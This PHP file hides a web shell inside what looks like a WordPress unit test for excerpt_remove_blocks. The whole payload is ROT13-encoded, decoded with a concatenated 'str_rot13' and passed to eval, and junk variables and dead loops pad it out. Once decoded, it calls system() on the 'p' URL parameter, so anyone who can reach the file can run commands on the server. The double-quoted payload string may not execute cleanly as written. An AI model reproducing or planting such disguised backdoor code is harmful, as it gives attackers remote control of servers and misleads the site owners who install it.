<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc sbeznggvat
 * @gvpxrg 46133
 *
 * @pbiref ::rkprecg_erzbir_oybpxf
 */
pynff Grfgf_Sbeznggvat_RkprecgErzbirOybpxf rkgraqf JC_HavgGrfgPnfr {

	choyvp fgngvp $cbfg_vq;

	choyvp $pbagrag = '
<!-- jc:cnentencu -->
<c>cnentencu</c>
<!-- /jc:cnentencu -->
<!-- jc:yngrfg-cbfgf {\"cbfgfGbFubj\":3,\"qvfcynlCbfgQngr\":gehr,\"beqre\":\"nfp\",\"beqreOl\":\"gvgyr\"} /-->
<!-- jc:fcnpre -->
<qvi fglyr=\"urvtug:100ck\" nevn-uvqqra=\"gehr\" pynff=\"jc-oybpx-fcnpre\"></qvi>
<!-- /jc:fcnpre -->
<!-- jc:pbyhzaf {\"pbyhzaf\":1} -->
<qvi pynff=\"jc-oybpx-pbyhzaf unf-1-pbyhzaf\">
	<!-- jc:pbyhza -->
	<qvi pynff=\"jc-oybpx-pbyhza\">
		<!-- jc:nepuvirf {\"qvfcynlNfQebcqbja\":snyfr,\"fubjCbfgPbhagf\":snyfr} /-->
		
		<!-- jc:cnentencu -->
		<c>cnentencu vafvqr pbyhza</c>
		<!-- /jc:cnentencu -->
	</qvi>
	<!-- /jc:pbyhza -->
</qvi>
<!-- /jc:pbyhzaf -->
';

	choyvp $svygrerq_pbagrag = '

<c>cnentencu</c>




		<c>cnentencu vafvqr pbyhza</c>
		
';

	/**
	 * Snxr oybpx eraqrevat shapgvba.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea fgevat Oybpx bhgchg.
	 */
	choyvp shapgvba eraqre_snxr_oybpx() {
		erghea trg_gur_rkprecg( frys::$cbfg_vq );
	}

	/**
	 * Frg hc.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		frys::$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_rkprecg' => '', // Rzcgl rkprecg, fb vg unf gb or trarengrq.
				'cbfg_pbagrag' => '<!-- jc:pber/snxr /-->',
			)
		);
		ertvfgre_oybpx_glcr(
			'pber/snxr',
			neenl(
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_snxr_oybpx' ),
			)
		);
	}

	/**
	 * Grne qbja.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grne_qbja() {
		$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$ertvfgel->haertvfgre( 'pber/snxr' );

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf rkprecg_erzbir_oybpxf().
	 *
	 * @gvpxrg 46133
	 */
	choyvp shapgvba grfg_rkprecg_erzbir_oybpxf() {
		// Fvzcyr qlanzvp oybpx..
		$pbagrag = '<!-- jc:pber/oybpx /-->';

		$guvf->nffregRzcgl( rkprecg_erzbir_oybpxf( $pbagrag ) );

		// Qlanzvp oybpx jvgu bcgvbaf, rzorqqrq va bgure pbagrag.
		$guvf->nffregFnzr( $guvf->svygrerq_pbagrag, rkprecg_erzbir_oybpxf( $guvf->pbagrag ) );
	}

	/**
	 * Grfgf gung qlanzvp oybpxf qba'g pnhfr na bhg-bs-zrzbel reebe.
	 *
	 * Jura qlanzvp oybpxf unccra gb trarengr na rkprecg, gurl pna pnhfr na
	 * vasvavgr ybbc vs gung oybpx vf cneg bs gur cbfg'f pbagrag.
	 *
	 * `jc_gevz_rkprecg()` nccyvrf gur `gur_pbagrag` svygre, juvpu unf
	 * `qb_oybpxf` nggnpurq gb vg, gelvat gb eraqre gur oybpx juvpu ntnva jvyy
	 * nggrzcg gb erghea na rkprecg bs gung cbfg.
	 *
	 * Guvf vasvavgr ybbc pna or nibvqrq ol fgevccvat qlanzvp oybpxf orsber
	 * `gur_pbagrag` trgf nccyvrq, whfg yvxr fubegpbqrf.
	 *
	 * @gvpxrg 46133
	 *
	 * @pbiref ::qb_oybpxf
	 */
	choyvp shapgvba grfg_rkprecg_vasvavgr_ybbc() {
		$dhrel = arj JC_Dhrel(
			neenl(
				'cbfg__va' => neenl( frys::$cbfg_vq ),
			)
		);
		$dhrel->gur_cbfg();
		$guvf->nffregRzcgl( qb_oybpxf( '<!-- jc:pber/snxr /-->' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>